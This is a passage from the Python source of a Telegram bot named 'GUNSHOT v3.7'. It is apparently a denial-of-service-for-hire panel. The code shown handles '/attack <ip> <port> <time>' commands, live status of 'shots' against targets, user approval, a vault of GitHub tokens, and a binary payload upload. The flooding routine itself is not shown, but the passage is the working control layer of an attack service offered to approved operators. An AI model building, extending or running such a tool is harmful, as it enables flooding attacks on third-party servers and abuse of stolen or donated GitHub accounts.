                "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "<b>Example:</b> <code>/attack 1.1.1.1 443 60</code>\n\n"
                "⏱️ Time: 5–7200s\n🔌 Port: 1–65535"
            )
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
            await send_or_edit(text, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data in ("status", "refresh_status"):
            if not can_attack(user_id):
                await send_or_edit("⛔ Access Denied")
                return
            if not active_attacks:
                text = "<b>📡 GUNSHOT – STANDBY</b>\n\nStatus : 🟢 IDLE"
            else:
                text = f"<b>📡 ACTIVE SHOTS ({len(active_attacks)})</b>\n\n"
                idx = 1
                for aid, d in active_attacks.items():
                    elapsed = int(time.time() - d['start_time'])
                    bar = progress_bar(elapsed, d['time'])
                    text += f"{idx}. <code>[{bar}]</code> {elapsed}s / {d['time']}s\n   TARGET: <code>{d['ip']}:{d['port']}</code>\n\n"
                    idx += 1
            keyboard = [
                [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")],
                [InlineKeyboardButton("🛑 Terminate All", callback_data="stop")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
            ]
            await send_or_edit(text, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "stop":
            if not can_attack(user_id):
                await send_or_edit("⛔ Access Denied")
                return
            if not active_attacks:
                msg = "✅ No active shots."
            else:
                count = len(active_attacks)
                for aid in list(active_attacks.keys()):
                    finish_attack(aid)
                msg = f"🛑 Terminated {count} shot(s)."
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "help_menu":
            text = "<b>🔫 COMMANDS</b>\n\nUse /help for full list."
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
            await send_or_edit(text, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "about_menu":
            text = "<b>🔫 GUNSHOT v3.7</b>\n\nHosted on Railway\nMotto: <b>\"Silence. Precision. Power.\"</b>"
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
            await send_or_edit(text, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "back_start":
            username = query.from_user.username or "NoUsername"
            total_attacks = sum(attack_counters.values())
            user_attacks = attack_counters.get(str(user_id), 0)
            if can_attack(user_id):
                role = "👑 OWNER" if is_owner(user_id) else "✅ APPROVED"
                keyboard = [
                    [InlineKeyboardButton("🚀 Launch Shot", callback_data="attack_help")],
                    [InlineKeyboardButton("📡 Live Status", callback_data="status")],
                    [InlineKeyboardButton("🛑 Abort All", callback_data="stop")],
                ]
                if is_owner(user_id):
                    keyboard.append([InlineKeyboardButton("⚙️ Admin Console", callback_data="admin_panel")])
                keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help_menu")])
                keyboard.append([InlineKeyboardButton("ℹ️ About", callback_data="about_menu")])
                message = (
                    f"<b>🔫 GUNSHOT v3.7</b>\n\n"
                    f"👤 <b>Operator</b> : @{username}\n"
                    f"👑 <b>Role</b>     : {role}\n"
                    f"🔄 <b>Tokens</b>   : {len(github_tokens)} Active\n"
                    f"📊 <b>Status</b>   : 🟢 ONLINE\n"
                    f"💥 <b>Kills</b>    : {user_attacks}\n"
                    f"🌐 <b>Global</b>   : {total_attacks}"
                )
                await send_or_edit(message, reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await send_or_edit("⛔ Access Denied.")

        elif data in ("admin_panel", "back_admin"):
            if not is_owner(user_id):
                await send_or_edit("⛔ Access Denied")
                return
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👤 User Tokens", callback_data="admin_usertokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("🧹 Check Tokens", callback_data="admin_checktokens")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_start")]
            ]
            await send_or_edit("🔧 <b>Admin Console</b>\n\nSelect option:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_tokens" and is_owner(user_id):
            removed = auto_remove_expired()
            if not github_tokens:
                msg = "📭 Vault empty."
            else:
                msg = "<b>🔐 TOKEN VAULT</b>\n\n"
                for i, t in enumerate(github_tokens, 1):
                    msg += f"{i}. @{t.get('username', '?')} – <code>{t['token'][:10]}…</code>\n"
                msg += f"\n📊 Total: {len(github_tokens)}"
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_users" and is_owner(user_id):
            if not approved_users:
                msg = "📭 No users."
            else:
                msg = "<b>👥 USERS</b>\n\n"
                for uid, d in approved_users.items():
                    msg += f"<code>{uid}</code> – {d.get('days', '?')}d – 💥 {attack_counters.get(uid, 0)}\n"
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_pending" and is_owner(user_id):
            if not pending_users:
                msg = "📭 No pending."
            else:
                msg = "<b>⏳ PENDING</b>\n\n"
                for u in pending_users:
                    msg += f"<code>{u.get('user_id')}</code> – @{u.get('username')}\n"
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_binary" and is_owner(user_id):
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit("📤 Use <code>/binary_upload</code>", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_usertokens" and is_owner(user_id):
            user_tokens = {}
            for t in github_tokens:
                user_tokens.setdefault(t.get('added_by', '?'), []).append(t)
            if not user_tokens:
                msg = "📭 No tokens."
            else:
                msg = "<b>📊 PER USER</b>\n\n"
                for uid, tk in user_tokens.items():
                    msg += f"<code>{uid}</code> – {len(tk)} tokens\n"
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_checktokens" and is_owner(user_id):
            if not github_tokens:
                msg = "📭 No tokens."
            else:
                removed = auto_remove_expired()
                msg = f"<b>🔍 HEALTH</b>\n\n📊 Total: {len(github_tokens)}\n🧹 Removed: {removed}"
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
            await send_or_edit(msg, reply_markup=InlineKeyboardMarkup(keyboard))

        else:
            await send_or_edit("❓ Unknown command.")

    except Exception as e:
        logger.error(f"Callback error: {e}")
        try:
            if query and query.message:
                await query.message.reply_text(f"⚠️ Error: {str(e)[:100]}", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Glitch. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN (Railway-safe) =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={
                WAITING_FOR_BINARY: [
                    MessageHandler(filters.Document.ALL, binary_upload_receive),
                    CommandHandler("cancel", binary_upload_cancel)
                ]
            },
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("mytokens", mytokens_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("usertokens", usertokens_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))

        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🔫 GUNSHOT v3.7 started on Railway!")
        logger.info(f"🔄 Tokens: {len(github_tokens)}")
        logger.info(f"📁 Data dir: {DATA_DIR}")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
